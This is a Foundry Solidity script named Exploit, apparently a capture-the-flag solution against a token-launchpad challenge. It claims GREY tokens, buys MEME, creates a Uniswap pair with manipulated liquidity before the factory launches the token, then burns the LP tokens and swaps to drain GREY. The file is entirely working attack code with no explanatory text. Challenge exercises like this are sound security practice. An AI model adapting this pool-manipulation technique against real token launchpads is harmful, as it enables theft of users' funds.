// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Script} from "../lib/forge-std/src/Script.sol";
import {Setup} from "../src/Setup.sol";
import {Factory} from "../src/Factory.sol";
import {Token} from "../src/Token.sol";
import {GREY} from "../src/lib/GREY.sol";
import {console2} from "../lib/forge-std/src/console2.sol";
import {UniswapV2Factory} from "src/lib/v2-core/UniswapV2Factory.sol";
import {IUniswapV2Pair} from "src/lib/v2-core/interfaces/IUniswapV2Pair.sol";
import {UniswapV2Pair} from "src/lib/v2-core/UniswapV2Pair.sol";

contract Exploit is Script {
    Setup setup;
    Factory factory;
    GREY grey;
    Token meme;
    UniswapV2Factory uniswapV2Factory;
    address me;

    constructor() {
        setup = Setup(vm.envAddress("SETUP_CONTRACT"));
        factory = setup.factory();
        grey = setup.grey();
        meme = setup.meme();
        uniswapV2Factory = setup.uniswapV2Factory();
        me = vm.envAddress("WALLET");
    }

    function run() external {
        vm.startBroadcast();

        // Claim the GREY tokens
        setup.claim();

        // Buy 5e18 - 1 GREY worth of MEME
        grey.approve(address(factory), type(uint256).max);
        meme.approve(address(factory), type(uint256).max);
        factory.buyTokens(address(meme), 5 ether - 1, 0);

        // Create a Uniswap pair for GREY and MEME
        address pair = uniswapV2Factory.createPair(address(grey), address(meme));

        // Provide liquidity to the pair
        grey.transfer(pair, 1);
        meme.transfer(pair, meme.balanceOf(me));
        uint256 lpToken = IUniswapV2Pair(pair).mint(me);

        // Launch the token
        factory.launchToken(address(meme));

        // Burn the LP tokens to remove liquidity
        UniswapV2Pair(pair).transfer(pair, lpToken);
        IUniswapV2Pair(pair).burn(me);

        // Swap the remaining MEME for GREY
        uint256 memeBalance = meme.balanceOf(me);
        meme.transfer(pair, memeBalance);
        uint256 minimumTargetGREY = 5.965 ether - grey.balanceOf(me);
        bool isGREYToken0 = (IUniswapV2Pair(pair).token0() == address(grey));
        IUniswapV2Pair(pair).swap(isGREYToken0 ? minimumTargetGREY : 0, isGREYToken0 ? 0 : minimumTargetGREY, me, "");
        
        vm.stopBroadcast();
    }
}
